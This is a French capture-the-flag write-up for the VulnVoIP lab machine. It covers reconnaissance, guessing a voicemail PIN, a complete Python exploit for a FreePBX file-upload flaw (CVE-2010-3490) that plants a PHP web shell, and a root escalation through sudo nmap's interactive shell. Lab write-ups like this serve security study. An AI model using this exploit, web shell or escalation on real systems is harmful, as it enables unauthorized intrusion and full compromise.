# Solution du CTF HackLAB : VulnVoIP

Nitro
-----

Après les CTFs [Vulnix](http://devloop.users.sourceforge.net/index.php?article95/solution-du-ctf-hacklab-vulnix) et [VulnVPN](http://devloop.users.sourceforge.net/index.php?article108/solution-du-ctf-hacklab-vulnvpn) voici mon writeup pour le dernier de la série *HackLAB* (du moins au moment de ces lignes) : [VulnVoIP](http://vulnhub.com/entry/hacklab-vulnvoip,40/).  

L'objectif final du challenge est d'obtenir un accès root mais aussi de trouver les utilisateurs VoIP et d'obtenir un accès à la boîte vocale du compte *Support*.  

Let's go
--------

```plain
Nmap scan report for 192.168.1.67
Host is up (0.0075s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 1f:e2:e8:9e:2c:f8:31:39:36:f7:1d:aa:77:5e:ac:76 (DSA)
|_  2048 38:a4:9d:29:8a:11:9d:e1:13:5d:5e:6d:76:a6:63:76 (RSA)
53/tcp   open  domain     dnsmasq 2.45
| dns-nsid: 
|   id.server: dns-resolver19-cbv4-pr
|_  bind.version: dnsmasq-2.45
80/tcp   open  http       Apache httpd 2.2.3 ((CentOS))
| http-methods: Potentially risky methods: TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: FreePBX
111/tcp  open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            964/udp  status
|_  100024  1            967/tcp  status
3306/tcp open  mysql      MySQL (unauthorized)
4445/tcp open  upnotifyp?
MAC Address: 00:0C:29:84:C0:91 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.18 - 2.6.32
Network Distance: 1 hop
```

Je vais m'attarder sur le site web (port 80). Un scan UDP rapide révèle aussi les ports suivants :  

```plain
PORT     STATE SERVICE
111/udp  open  rpcbind
5353/udp open  zeroconf
```

Quand on se rend sur la racine web on trouve une page web avec deux liens, l'un vers l'interface */admin/* protégée par mot de passe (authentification HTTP) ainsi qu'un lien vers */recordings/* qui demande là encore la saisie d'identifiants mais semblent destiné à plusieurs comptes utilisateurs.  

Cette page de login */recordings/* indique que l'on a affaire à une version 2.6 de *FreePBX*. Une indication informe qu'il faut se connecter avec l'extension comme nom d'utilisateur et comme mot de passe le même que celui du téléphone (donc très certainement numérique).  

![Recordings FreePBX](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnvoip/recordings.png)

Un coup de *buster* via le récent module *Wapiti* du même nom permet de trouver des ressources supplémentaires comme sur */panel/* où l'on trouve une interface web (baptisée *Flash Operator Panel*) qui liste des utilisateurs avec leur extension téléphonique.  

![FreePBX Flsh Panel](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnvoip/panel.png)

J'ai jeté aussi un coup d’œil dans les modules *Metasploit* : deux modules existent mais je n'ai pas eu de résultats probants et suis resté en *"manuel".*  

```plain
exploit/unix/http/freepbx_callmenum      2012-03-20       manual     FreePBX 2.10.0 / 2.9.0 callmenum Remote Code Execution
exploit/unix/webapp/freepbx_config_exec  2014-03-21       excellent  FreePBX config.php Remote Code Execution
```

Après plusieurs tentatives sur */recordings/* je trouve le mot de passe *000* pour le compte *support* (extension *2000*).  

Une fois connecté on trouve deux messages enregistrés (au format wav) à télécharger. L'un est simplement *"Good bye"* mais l'autre est le suivant :  

> Hey Mark, I think the support web access account has been compromised.  
> 
> I have changed the password to securesupport123 all one word and lowercase.  
> 
> You can log using the usual address.  
> 
> See you in the morning.

PBXploitation
-------------

Via l'interface */admin/* il est alors possible de se connecter avec *support* / *securesupport123*.  

Le numéro de version affiché pour *FreePBX* est ici le 2.7.0.0.  

Il faut croire que l'auteur du challenge a installé des parties de deux versions différentes (peut être pour fournir des vulnérabilités spécifiques).  

Comme l'exploit de *Metasploit* pour la faille d'upload n'avait pas l'air d'aboutir je me suis basé sur un advisory de *Trustwave's SpiderLabs* trouvé sur *exploit-db* et j'ai codé l'exploit suivant (du coup je l'ai soumis à *SecurityFocus* au cas où) :  

```python
import requests
import random
import string
import sys

# Original advisory : http://www.exploit-db.com/exploits/15098/

print("devloop exploit for FreePBX <= 2.8.0 (CVE-2010-3490)")
if len(sys.argv) != 4:
    print("Usage: {0} <url_to_freepbx_admin_directory> <username> <password>")
    sys.exit()

BASE = sys.argv[1]
USER = sys.argv[2]
PASS = sys.argv[3]
KEYW = "devloop"

if not BASE.endswith("/"):
    BASE += "/"

sess = requests.session()
creds = (USER, PASS)

r = sess.get(BASE + "config.php", auth=creds)
if "Logged in:" in r.content:
    print("[+] Connection successful")
else:
    print("[!] Unable to login... check credentials and url")
    sys.exit()

data = {
    'action': 'recorded',
    'display': 'recordings',
    'usersnum': '../../../../../var/www/html/admin/{0}'.format(KEYW),
    'rname': "".join([random.choice(string.hexdigits) for _ in xrange(10)]),
    'Submit': 'Save'
    }

content = "<?php system($_GET['cmd']); ?>"
files = {
        'ivrfile': ('backdoor.php', content, 'application/octet-stream')
        }
hdrs = {"referer": BASE + "config.php?type=setup&display=recordings"}

r = sess.post(BASE + "config.php?type=setup&display=recordings",
        data=data,
        files=files,
        auth=creds,
        headers=hdrs)

print("[i] Testing shell at address {0}{1}-ivrrecording.php".format(BASE, KEYW))
r = requests.get(BASE + KEYW + "-ivrrecording.php?cmd=uname+-a", auth=creds)
if r.status_code != 200:
    print("[-] Received HTTP code {0} for this url".format(r.status_code))
else:
    print("HTTP 200 OK")
    print r.content
```

L'upload passe correctement :  

```plain
$ python sploit.py 
devloop exploit for FreePBX <= 2.8.0 (CVE-2010-3490)
Usage: {0} <url_to_freepbx_admin_directory> <username> <password>
$ python sploit.py http://192.168.1.67/admin/ support securesupport123
devloop exploit for FreePBX <= 2.8.0 (CVE-2010-3490)
[+] Connection successful
[i] Testing shell at address http://192.168.1.67/admin/devloop-ivrrecording.php
HTTP 200 OK
Linux vulnvoip.localdomain 2.6.18-308.16.1.el5 #1 SMP Tue Oct 2 22:01:37 EDT 2012 i686 i686 i386 GNU/Linux
```

Les scripts PHP tournent avec les droits d'*asterisk* (*uid=101(asterisk) gid=103(asterisk) groups=103(asterisk)*)  

Après la mise en place d'un serveur *tsh* je remarque qu'il n'y a pas d'utilisateurs sur le système (pas de dossiers dans */home*).  

The way to root
---------------

On trouve un fichier appartenant à root et word-writable qui semble d'aucune utilité :  

```plain
bash-3.2$ find / -user root -perm -o+w -type f 2> /dev/null  | grep -v /proc
/var/spool/asterisk/voicemail/default/2000/INBOX/msg0001.txt
bash-3.2$ cat /var/spool/asterisk/voicemail/default/2000/INBOX/msg0001.txt
;
; Message Information file
;
[message]
origmailbox=2000
context=macro-vm
macrocontext=from-internal
exten=s-CHANUNAVAIL
priority=2
callerchan=Local/2000@from-internal-ba5d;2
callerid=VMAIL/2000
origdate=Mon Sep 29 08:22:29 PM UTC 2014
origtime=1412022149
category=
flag=
duration=1
```

Par contre les permissions *sudo* sont visiblement à approfondir :  

```plain
bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"

Runas and Command-specific defaults for asterisk:

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /usr/bin/nmap
```

Je ne connais pas bien *yum* et je ne sais pas avec quelle facilité il est possible de lui faire exécuter des commandes...  

On peut sinon utiliser *yum* pour installer un logiciel vulnérable et ensuite exploiter ce dernier ou créer un paquet *rpm* contenant une backdoor (un peu prise de tête).  

Du coup, après un coup d’œil dans la page de manuel de *nmap*, je l'appelle en mode interactif et invoque */bin/bash* :  

```plain
bash-3.2$ sudo /usr/bin/nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !/bin/bash
bash-3.2# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
bash-3.2# cd /root
bash-3.2# ls
anaconda-ks.cfg  trophy.txt
bash-3.2# cat trophy.txt 
cc614640424f5bd60ce5d5264899c3be
```

Finish

*Published October 01 2014 at 18:57*